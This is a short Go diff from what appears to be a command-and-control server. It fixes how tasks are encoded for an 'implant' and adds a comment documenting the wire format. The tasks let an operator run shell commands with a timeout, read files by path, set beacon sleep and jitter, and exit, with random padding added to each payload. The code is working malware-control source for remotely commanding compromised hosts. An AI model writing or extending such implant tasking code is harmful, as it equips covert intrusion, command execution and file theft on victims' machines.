@@ -360,16 +360,20 @@ func parseCheckin(plain []byte) (*checkin, error) {
 }
 
 // buildTaskPayload encodes pending tasks plus a random padding TLV.
+// Wire contract (matches implant run_tasks and the spec TLV table):
+// exec = [id u32][timeout u16][cmd], read = [id u32][path],
+// sleep = [interval u32][jitter u8], exit = empty. Only exec/read carry an ID.
 func buildTaskPayload(tasks []Task, padLen int) ([]byte, error) {
 	items := make([]tlv, 0, len(tasks)+1)
 	for _, t := range tasks {
 		value := make([]byte, 0, 10+len(t.Cmd)+len(t.Path))
-		value = binary.LittleEndian.AppendUint32(value, t.ID)
 		switch t.Type {
 		case TaskExec:
+			value = binary.LittleEndian.AppendUint32(value, t.ID)
 			value = binary.LittleEndian.AppendUint16(value, t.TimeoutSec)
 			value = append(value, t.Cmd...)
 		case TaskRead:
+			value = binary.LittleEndian.AppendUint32(value, t.ID)
 			value = append(value, t.Path...)
 		case TaskSleep:
 			value = binary.LittleEndian.AppendUint32(value, t.IntervalSec)
